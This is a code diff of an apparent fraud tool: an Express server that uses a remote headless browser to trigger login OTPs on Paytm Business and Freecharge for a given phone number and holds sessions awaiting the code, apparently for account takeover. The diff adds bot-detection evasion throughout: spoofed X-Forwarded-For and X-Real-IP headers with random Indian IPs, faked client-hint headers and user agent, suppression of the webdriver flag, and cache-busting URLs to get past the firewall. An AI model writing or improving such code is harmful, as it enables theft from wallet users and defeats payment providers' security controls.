@@ -24,7 +24,7 @@ app.get('/next/micro/ca/approvals', (req, res) => res.json({ success: true, pend
 app.get('/next/micro/disbursal/disbursal', (req, res) => res.json({ success: true, balance: 0 }));
 
 // ==========================================
-// STEP 1: TRIGGER OTP VIA BROWSERLESS (ULTRA STEALTH & FIXED UI)
+// STEP 1: TRIGGER OTP VIA BROWSERLESS (ULTRA STEALTH + HAIL MARY BYPASS)
 // ==========================================
 app.post('/api/start-tool', async (req, res) => {
     const { phone, walletType } = req.body;
@@ -39,7 +39,7 @@ app.post('/api/start-tool', async (req, res) => {
     
     activeSessions[phone] = { status: 'waiting_for_otp', upiId: null, browser: null, page: null };
     
-    // 🛑 Yahan se res.json hata diya hai taaki app turant fake success na dikhaye!
+    // 🛑 res.json yahan se hata hua hai (Fake success roke)
 
     try {
         console.log(`[+] Connecting to Browserless.io for: ${phone}`);
@@ -50,13 +50,14 @@ app.post('/api/start-tool', async (req, res) => {
         });
 
         const page = await browser.newPage();
-        await page.setUserAgent('Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36');
-
+        
         activeSessions[phone].browser = browser;
         activeSessions[phone].page = page;
 
         if (walletType.toLowerCase().includes('freecharge')) {
             console.log(`[!] Opening Freecharge for ${phone}...`);
+            await page.setUserAgent('Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36');
+            
             await page.goto('https://www.freecharge.in/', { waitUntil: 'domcontentloaded', timeout: 60000 });
             await new Promise(r => setTimeout(r, 3000)); 
 
@@ -70,38 +71,51 @@ app.post('/api/start-tool', async (req, res) => {
             await page.keyboard.press('Enter');
 
         } else {
-            console.log(`[!] Opening Paytm Business for ${phone}...`);
+            console.log(`[!] Opening Paytm Business (HAIL MARY BYPASS) for ${phone}...`);
             
-            // 🔥 ULTIMATE BYPASS: Indian IP aur Browser spoofing headers
+            // 🔥 TRICK 1: Jio ka ek Random Indian IP generate karna
+            const randomIP = `49.36.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`; 
+
+            // 🔥 TRICK 2: Paytm ke Firewall ko Fake IP aur Fake Headers bhejna
             await page.setExtraHTTPHeaders({
                 'Accept-Language': 'en-IN,en-US;q=0.9,en;q=0.8,hi;q=0.7',
+                'X-Forwarded-For': randomIP,
+                'X-Real-IP': randomIP,
+                'Sec-Ch-Ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
+                'Sec-Ch-Ua-Mobile': '?0',
+                'Sec-Ch-Ua-Platform': '"Windows"',
                 'Sec-Fetch-Dest': 'document',
                 'Sec-Fetch-Mode': 'navigate',
                 'Sec-Fetch-Site': 'none',
-                'Sec-Fetch-User': '?1'
+                'Sec-Fetch-User': '?1',
+                'Upgrade-Insecure-Requests': '1'
             });
 
-            // Webdriver flag ko destroy karna
+            // 🔥 TRICK 3: Mobile ki jagah Desktop ban ke jayenge taaki WAF block na kare
+            await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36');
+
+            // Webdriver trace mitana
             await page.evaluateOnNewDocument(() => {
                 Object.defineProperty(navigator, 'webdriver', { get: () => false });
             });
 
-            // Page load networkidle2 se karenge (Security script poori load hone do)
-            await page.goto('https://dashboard.paytm.com/login/', { waitUntil: 'networkidle2', timeout: 60000 });
-            await new Promise(r => setTimeout(r, 3000)); 
+            // 🔥 TRICK 4: Cache Buster URL (Naya link taaki purani block IP yaad na rakhe)
+            const cacheBuster = Date.now();
+            const spoofedUrl = `https://dashboard.paytm.com/login/?ref=app&_t=${cacheBuster}`;
+            
+            await page.goto(spoofedUrl, { waitUntil: 'domcontentloaded', timeout: 60000 });
+            await new Promise(r => setTimeout(r, 4000)); 
 
             let pageText = await page.evaluate(() => document.body.innerText);
             if (pageText.toLowerCase().includes('server busy') || pageText.toLowerCase().includes('something went wrong')) {
-                console.log(`[!] PAYTM BLOCKED IP: Server Busy dikha raha hai!`);
-                throw new Error("Paytm Anti-Bot Block (Server Busy)");
+                console.log(`[!] BLOCKED AGAIN: WAF ne IP pakad li.`);
+                throw new Error("Paytm Firewall Block (Server Busy)");
             }
 
-            // Dheere type karo
             let inputField = await page.waitForSelector('input[type="tel"], input[name="mobileNumber"]', { timeout: 15000 });
             await inputField.focus(); 
-            await inputField.type(phone, { delay: 150 }); 
+            await inputField.type(phone, { delay: 200 }); // Ekdum dheere type karna
 
-            // Asli click karo
             await page.evaluate(() => {
                 const btns = Array.from(document.querySelectorAll('button'));
                 const proceedBtn = btns.find(b => b.innerText && (b.innerText.toLowerCase().includes('proceed') || b.innerText.toLowerCase().includes('login') || b.innerText.toLowerCase().includes('sign in')));
@@ -112,7 +126,7 @@ app.post('/api/start-tool', async (req, res) => {
         
         console.log(`[!] OTP Triggered on Browserless for ${phone}`);
 
-        // 🔥 FIX: Asli success response yahan bhejenge, jab sach mein click ho chuka ho!
+        // 🔥 FIX: Asli success response
         res.json({ success: true, message: "OTP sent! Waiting for input..." });
 
         setTimeout(async () => {
@@ -130,7 +144,6 @@ app.post('/api/start-tool', async (req, res) => {
                 try { await activeSessions[phone].browser.close(); } catch(err){}
             }
         }
-        // 🔥 FIX: Agar captcha ya error aayi toh app ko fail dikhayega, success nahi!
         res.status(500).json({ success: false, message: "Timeout or Blocked: " + e.message });
     }
 });
